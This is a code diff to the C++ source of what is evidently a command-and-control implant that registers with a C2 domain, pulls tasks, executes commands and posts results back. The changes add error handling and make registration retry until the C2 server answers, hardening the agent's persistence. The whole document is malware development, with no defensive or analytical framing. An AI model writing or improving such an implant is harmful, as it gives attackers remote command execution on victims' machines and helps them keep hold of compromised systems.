@@ -42,6 +42,9 @@ BOOL registerAgent() {
 
     std::string jsonString = jsonPayload.dump();
     std::string response = httpPost(c2Domain, port, registerURI, jsonString);
+    if (response == "Error") {
+        return FALSE;
+    }
     std::cout << response << std::endl;
 
     json jsonResponse = json::parse(response);
@@ -70,6 +73,10 @@ void executeCommands(std::vector<std::string> cmds) {
 
         std::string response = httpPost(c2Domain, port, sendResultURI, jsonString);
 
+        if (response == "Error") {
+            return;
+        }
+
         std::cout << response << std::endl;
     }
 }
@@ -83,6 +90,11 @@ void getTasksAndExecute() {
     std::string jsonString = jsonPayload.dump();
 
     std::string response = httpPost(c2Domain, port, getTaskURI, jsonString);
+
+    if (response == "Error") {
+        return;
+    }
+
     json jsonResponse = json::parse(response);
 
     if (jsonResponse["status"] == "ok") {
@@ -105,7 +117,10 @@ int main(int argc, char* argv[]){
     }
 
     agentId = generateRandomId(10);
-    registerAgent();
+    BOOL registered = FALSE;
+    do {
+        registered = registerAgent();
+    } while (!registered);
 
     int i = 3;
     while(i > 0) {
